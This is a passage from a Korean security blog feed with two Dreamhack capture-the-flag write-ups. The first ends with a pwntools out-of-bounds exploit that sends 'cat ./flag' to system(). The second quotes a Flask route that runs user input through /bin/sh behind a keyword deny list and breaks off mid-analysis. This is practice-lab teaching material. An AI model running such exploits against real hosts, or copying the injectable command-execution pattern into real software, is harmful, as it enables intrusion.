class=&quot;kt&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;PTR&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x804a060&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x0804873e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;115&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;nv&quot;&gt;sub&lt;/span&gt;    &lt;span class=&quot;nb&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xc&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x08048741&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;118&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt;   &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x08048742&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;119&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;nv&quot;&gt;call&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x8048500&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;system@plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;단순히 내가 입력했던 명령어의 시작 주소를 가리키도록 line 108을 조정하면 eax에는 내가 입력했던 명령어의 앞 4byte만 들어간다. 또한, 기본적으로 참조할 주소를 저장하는 레지스터의 특성상 아무 일도 일어나지 않는다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-out-of-bound/Untitled_9.png&quot; alt=&quot;/assets/img/posts/2024-12-01-out-of-bound/Untitled_9.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;첫번째로 입력을 받을 때 0x10byte를 받는다.&lt;/p&gt;

&lt;p&gt;내가 이용할 수 있는 건 16 byte의 공간이다.&lt;/p&gt;

&lt;p&gt;그 중 처음 4byte를 이후 12byte의 시작 주소가 되도록 조정한다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;[시도 3]&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;# p = process(&apos;./out_of_bound&apos;)p=remote(&apos;host3.dreamhack.games&apos;, 14273)
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x804a0b0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;endian&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;little&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;cat ./flag&apos;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Admin name: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;What do you want?: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;19&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# gdb.attach(p, gdbscript=&apos;b *(main+115)&apos;)p.interactive()
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;[결과]&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-out-of-bound/Untitled_10.png&quot; alt=&quot;/assets/img/posts/2024-12-01-out-of-bound/Untitled_10.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;플래그 획득에 성공했다!&lt;/p&gt;
</description>
        <pubDate>Sun, 01 Dec 2024 01:00:00 -0600</pubDate>
        <link>https://touBVa.github.io/blog/system_hacking/2024-12-01-out-of-bound</link>
        <guid isPermaLink="true">https://touBVa.github.io/blog/system_hacking/2024-12-01-out-of-bound</guid>
      </item>
    
      <item>
        <title>Dreamhack-bypassIf 문제 풀이</title>
        <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#0-행위-확인&quot; id=&quot;markdown-toc-0-행위-확인&quot;&gt;0. 행위 확인&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#1-소스-확인정적-분석&quot; id=&quot;markdown-toc-1-소스-확인정적-분석&quot;&gt;1. 소스 확인(정적 분석)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;0-행위-확인&quot;&gt;0. 행위 확인&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Burp에 넣고 해당 사이트의 하위 URL을 다 들어가 봤다. Sitemap을 확인하기 위한 절차&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-bypassIf/image.png&quot; alt=&quot;/assets/img/posts/2024-12-01-bypassIf/image.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;/flag 서브url이 보인다.&lt;/p&gt;

&lt;p&gt;GET에 파라미터가 들어간다면 그렇게 들어간 파라미터가 이후 flow에서 페이지 템플릿에 반영되는지 여부를 확인하여 rXSS를 해볼 수 있을 것 같은데,&lt;/p&gt;

&lt;p&gt;그건 없는 것 같다.&lt;/p&gt;

&lt;p&gt;그렇다면 유저와 상호작용하는 부분은 저기 POST 요청만 남는다.&lt;/p&gt;

&lt;p&gt;해당 부분을 확인해 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-bypassIf/image%201.png&quot; alt=&quot;/assets/img/posts/2024-12-01-bypassIf/image.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;내가 테스트 겸 입력했던 key 값이 들어가 있다.&lt;/p&gt;

&lt;p&gt;뭔가 정답이 아니면 302 응답을 통해 루트 도메인으로 리다이렉팅 해주는 것 같다.&lt;/p&gt;

&lt;p&gt;문제 제목이 bypassif이니, 아마 if문을 통해 정답 여부를 판별하는 것 같다.&lt;/p&gt;

&lt;p&gt;서버 단 에러 메시지를 유발해 웹 프레임워크의 기능을 bypass할지 / 웹 서비스의 기능을 bypass할지 여부를 판별해 보는 것도 흥미로운 접근일 듯해 시도해 보았다.&lt;/p&gt;

&lt;p&gt;(높은 확률로 서비스 기능이겠지만 재미있을 것 같아 오버헤드를 감수했다)&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-bypassIf/image%202.png&quot; alt=&quot;/assets/img/posts/2024-12-01-bypassIf/image.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-bypassIf/image%203.png&quot; alt=&quot;/assets/img/posts/2024-12-01-bypassIf/image.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;쿠키가 없는 요청이기 때문에 Repeater로 보내 리플레이하더라도 아무 문제 없다.&lt;/p&gt;

&lt;p&gt;특수 문자를 넣은 키값을 보내 보았는데 요청 자체는 동일하다. 서버 단에서 그냥 string으로 처리하는 것으로 보이는데….&lt;/p&gt;

&lt;p&gt;이제 소스를 들여다보자.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;1-소스-확인정적-분석&quot;&gt;1. 소스 확인(정적 분석)&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;route&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;/flag&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;methods&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;POST&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
     &lt;span class=&quot;c1&quot;&gt;# POST request
&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;method&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;POST&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;form&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;key&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;form&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;cmd_input&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&apos;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KEY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;render_template&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;flag.html&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;txt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FLAG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&apos;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;guest_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;render_template&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;guest.html&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;txt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;guest key: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;guest_key&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&apos;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KEY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# or로 해둬서 관리자 키값이 필요 없음
&lt;/span&gt;            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;filter_cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;check_output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;/bin/sh&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;-c&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;render_template&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;flag.html&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;txt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;utf-8&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TimeoutExpired&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;render_template&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;flag.html&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;txt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;Timeout! Your key: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KEY&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CalledProcessError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;render_template&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;flag.html&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;txt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Error!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;render_template&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;flag.html&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;redirect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;/&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; 
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;render_template&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;flag.html&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        
        
&lt;span class=&quot;c1&quot;&gt;# filtering
&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;filter_cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;alphabet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ascii_lowercase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;alphabet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;extend&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos; &apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;num&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;0123456789&apos;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;alphabet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;extend&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;num&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;command_list&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;flag&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;cat&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;chmod&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;head&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;tail&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;less&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;awk&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;more&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;grep&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;command_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;alphabet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;오&lt;/p&gt;

&lt;p&gt;ls -al 해봐야지&lt;/p&gt;

&lt;p&gt;커맨드에 띄어쓰기를 넣고 싶어서(ls -al) content-type 헤더에 appliation/json을 추가했는데, 서버에서 인식을 못하는 것 같음&lt;/p&gt;

&lt;p&gt;그래서 아래처럼 request를 보내보았음&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

